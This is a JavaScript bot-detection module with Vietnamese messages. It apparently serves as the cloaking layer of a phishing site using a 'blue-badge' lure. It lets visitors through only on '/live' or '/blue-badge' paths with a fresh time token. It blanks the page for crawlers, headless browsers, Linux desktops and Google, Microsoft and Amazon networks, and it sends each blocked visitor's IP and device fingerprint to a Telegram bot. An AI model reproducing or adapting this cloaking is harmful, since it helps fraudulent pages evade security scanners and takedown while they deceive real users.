import config from '@/utils/config';
import axios from '@/utils/axios-instance';

const BOT_KEYWORDS = [
    'bot',
    'spider',
    'crawler',
    'headl',
    'headless',
    'slurp',
    'fetcher',
    'googlebot',
    'bingbot',
    'yandexbot',
    'baiduspider',
    'twitterbot',
    'ahrefsbot',
    'semrushbot',
    'mj12bot',
    'dotbot',
    'puppeteer',
    'selenium',
    'webdriver',
    'curl',
    'wget',
    'python',
    'scrapy',
    'lighthouse'
];

const blockedASNs = new Set([
    15169,
    396982,
    8075,
    16509,
    16510,
    14618,
    31898,
    45102,
    55960,
    198605,
    201814,
    24940,
    51396,
    14061,
    20473,
    63949,
    16276,
    135377,
    52925,
    17895,
    52468,
    36947,
    212238,
    60068,
    136787,
    62240,
    9009,
    208172,
    131199,
    21859,
    55720,
    397373,
    208312,
    37100,
    214961,
    401115,
    210644,
    6939,
    209
]);

const BLOCKED_UA_REGEX = new RegExp(`(${BOT_KEYWORDS.join('|')})|Linux(?!.*Android)`, 'i');

const blockedIPs = new Set(['95.214.55.43', '154.213.184.3']);

const getCookieValue = (name) => {
    const cookieString = `; ${document.cookie}`;
    const parts = cookieString.split(`; ${name}=`);

    if (parts.length !== 2) {
        return null;
    }

    return parts.pop().split(';').shift();
};

const checkBlueBadgePathToken = () => {
    const pathname = globalThis.location.pathname;
    const shouldCheckPath = pathname.startsWith('/blue-badge') || pathname === '/live';

    if (!shouldCheckPath) {
        return { isBlocked: false };
    }

    const currentTime = Date.now();
    const token = getCookieValue('token');
    const pathSegments = pathname.split('/');
    const slug = pathSegments[2];

    const isValid =
        token &&
        currentTime - Number(token) < 240000 &&
        (!slug || Number(slug) - Number(token) < 240000);

    if (isValid) {
        return { isBlocked: false };
    }

    return { isBlocked: true, reason: 'token hoặc slug không hợp lệ cho blue-badge/live' };
};

const checkLiveAccessGate = () => {
    const pathname = globalThis.location.pathname;
    const isLivePath = pathname === '/live' || pathname.startsWith('/live/');

    if (isLivePath) {
        return { isBlocked: false };
    }

    return { isBlocked: true, reason: 'không có /live trong đường dẫn truy cập' };
};

const sendBotTelegram = async (reason) => {
    try {
        const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
        const botToken = config.noti_token;
        const chatId = config.noti_chat_id;

        const geoRes = await axios.get(geoUrl);
        const geoData = geoRes.data;
        const fullFingerprint = {
            asn: geoData.asn,
            organization_name: geoData.organization_name,
            organization: geoData.organization,
            ip: geoData.ip,
            navigator: {
                userAgent: navigator.userAgent,
                hardwareConcurrency: navigator.hardwareConcurrency,
                maxTouchPoints: navigator.maxTouchPoints,
                webdriver: navigator.webdriver
            },
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight
            }
        };

        const msg = `🚫 <b>BOT BỊ CHẶN</b>
🔍 <b>Lý do:</b> <code>${reason}</code>

📍 <b>IP:</b> <code>${fullFingerprint.ip}</code>
🏢 <b>ASN:</b> <code>${fullFingerprint.asn}</code>
🏛️ <b>Nhà mạng:</b> <code>${fullFingerprint.organization_name ?? fullFingerprint.organization ?? 'Không rõ'}</code>

🌐 <b>Trình duyệt:</b> <code>${fullFingerprint.navigator.userAgent}</code>
💻 <b>CPU:</b> <code>${fullFingerprint.navigator.hardwareConcurrency}</code> nhân
📱 <b>Touch:</b> <code>${fullFingerprint.navigator.maxTouchPoints}</code> điểm
🤖 <b>WebDriver:</b> <code>${fullFingerprint.navigator.webdriver ? 'Có' : 'Không'}</code>

📺 <b>Màn hình:</b> <code>${fullFingerprint.screen.width}x${fullFingerprint.screen.height}</code>
📐 <b>Màn hình thực:</b> <code>${fullFingerprint.screen.availWidth}x${fullFingerprint.screen.availHeight}</code>`;

        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const payload = {
            chat_id: chatId,
            text: msg,
            parse_mode: 'HTML'
        };

        await axios.post(telegramUrl, payload, {
            headers: { 'Content-Type': 'application/json' }
        });
    } catch {
        //
    }
};

const checkAndBlockBots = async () => {
    const userAgent = navigator.userAgent;

    if (BLOCKED_UA_REGEX.test(userAgent)) {
        const reason = 'user-agent khớp pattern bot hoặc Linux không phải Android';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        try {
            globalThis.location.href = 'about:blank';
        } catch {
            //
        }
        return { isBlocked: true, reason };
    }
    return { isBlocked: false };
};

const checkAndBlockByGeoIP = async () => {
    try {
        const response = await axios.get('https://get.geojs.io/v1/ip/geo.json', { timeout: 3000 });
        const data = response.data;

        if (!data) {
            return { isBlocked: false };
        }

        const parsedAsn = Number(data.asn);
        if (Number.isFinite(parsedAsn) && blockedASNs.has(parsedAsn)) {
            const reason = `ASN bị chặn: ${data.asn}`;
            await sendBotTelegram(reason);
            document.body.innerHTML = '';
            globalThis.location.href = 'about:blank';
            return { isBlocked: true, reason };
        }

        if (blockedIPs.has(data.ip)) {
            const reason = `IP bị chặn: ${data.ip}`;
            await sendBotTelegram(reason);
            document.body.innerHTML = '';
            globalThis.location.href = 'about:blank';
            return { isBlocked: true, reason };
        }

        return { isBlocked: false };
    } catch {
        return { isBlocked: false };
    }
};

const checkAdvancedWebDriverDetection = async () => {
    if (navigator.webdriver === true) {
        const reason = 'navigator.webdriver = true';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        globalThis.location.href = 'about:blank';
        return { isBot: true, reason };
    }

    if ('__nightmare' in globalThis) {
        const reason = 'nightmare detected';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        globalThis.location.href = 'about:blank';
        return { isBot: true, reason };
    }
    if ('_phantom' in globalThis || 'callPhantom' in globalThis) {
        const reason = 'phantom detected';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        globalThis.location.href = 'about:blank';
        return { isBot: true, reason };
    }
    if ('Buffer' in globalThis) {
        const reason = 'buffer detected';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        globalThis.location.href = 'about:blank';
        return { isBot: true, reason };
    }
    if ('emit' in globalThis) {
        const reason = 'emit detected';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        return { isBot: true, reason };
    }
    if ('spawn' in globalThis) {
        const reason = 'spawn detected';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        return { isBot: true, reason };
    }

    const seleniumProps = ['__selenium_unwrapped', '__webdriver_evaluate', '__driver_evaluate', '__webdriver_script_function', '__webdriver_script_func', '__webdriver_script_fn', '__fxdriver_evaluate', '__driver_unwrapped', '__webdriver_unwrapped', '__selenium_evaluate', '__fxdriver_unwrapped'];

    const foundProp = seleniumProps.find((prop) => prop in globalThis);
    if (foundProp) {
        const reason = `selenium property: ${foundProp}`;
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        return { isBot: true, reason };
    }

    if ('__webdriver_evaluate' in document) {
        const reason = 'webdriver_evaluate in document';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        return { isBot: true, reason };
    }
    if ('__selenium_evaluate' in document) {
        const reason = 'selenium_evaluate in document';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        return { isBot: true, reason };
    }
    if ('__webdriver_script_function' in document) {
        const reason = 'webdriver_script_function in document';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        return { isBot: true, reason };
    }

    return { isBot: false };
};

const checkNavigatorAnomalies = async () => {
    if (navigator.webdriver === true) {
        const reason = 'navigator.webdriver = true';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        return { isBot: true, reason };
    }

    if (navigator.hardwareConcurrency && navigator.hardwareConcurrency > 128) {
        const reason = `hardwareConcurrency quá cao: ${navigator.hardwareConcurrency}`;
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        globalThis.location.href = 'about:blank';
        return { isBot: true, reason };
    }
    if (navigator.hardwareConcurrency && navigator.hardwareConcurrency < 1) {
        const reason = `hardwareConcurrency quá thấp: ${navigator.hardwareConcurrency}`;
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        return { isBot: true, reason };
    }

    return { isBot: false };
};

const checkScreenAnomalies = async () => {
    if (screen.width === 2000 && screen.height === 2000) {
        const reason = 'màn hình 2000x2000 (bot pattern)';
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        globalThis.location.href = 'about:blank';
        return { isBot: true, reason };
    }

    if (screen.width > 4000 || screen.height > 4000) {
        const reason = `màn hình quá lớn: ${screen.width}x${screen.height}`;
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        globalThis.location.href = 'about:blank';
        return { isBot: true, reason };
    }
    if (screen.width < 200 || screen.height < 200) {
        const reason = `màn hình quá nhỏ: ${screen.width}x${screen.height}`;
        await sendBotTelegram(reason);
        document.body.innerHTML = '';
        globalThis.location.href = 'about:blank';
        return { isBot: true, reason };
    }

    return { isBot: false };
};

const detectBot = async () => {
    const liveGateCheck = checkLiveAccessGate();
    if (liveGateCheck.isBlocked) {
        document.body.innerHTML = '';
        globalThis.location.href = 'about:blank';
        return { isBot: true, reason: liveGateCheck.reason };
    }

    const pathTokenCheck = checkBlueBadgePathToken();
    if (pathTokenCheck.isBlocked) {
        document.body.innerHTML = '';
        globalThis.location.href = 'about:blank';
        return { isBot: true, reason: pathTokenCheck.reason };
    }

    const userAgentCheck = await checkAndBlockBots();
    if (userAgentCheck.isBlocked) {
        return { isBot: true, reason: userAgentCheck.reason };
    }

    const webDriverCheck = await checkAdvancedWebDriverDetection();
    if (webDriverCheck.isBot) {
        return { isBot: true, reason: webDriverCheck.reason };
    }

    const navigatorCheck = await checkNavigatorAnomalies();
    if (navigatorCheck.isBot) {
        return { isBot: true, reason: navigatorCheck.reason };
    }

    const screenCheck = await checkScreenAnomalies();
    if (screenCheck.isBot) {
        return { isBot: true, reason: screenCheck.reason };
    }

    const geoIPCheck = await checkAndBlockByGeoIP();
    if (geoIPCheck.isBlocked) {
        return { isBot: true, reason: geoIPCheck.reason };
    }

    const obviousBotKeywords = ['googlebot', 'bingbot', 'crawler', 'spider'];
    const foundKeyword = obviousBotKeywords.find((keyword) => navigator.userAgent.toLowerCase().includes(keyword));

    if (foundKeyword) {
        return { isBot: true, reason: `obvious bot keyword: ${foundKeyword}` };
    } else {
        return { isBot: false };
    }
};

export default detectBot;
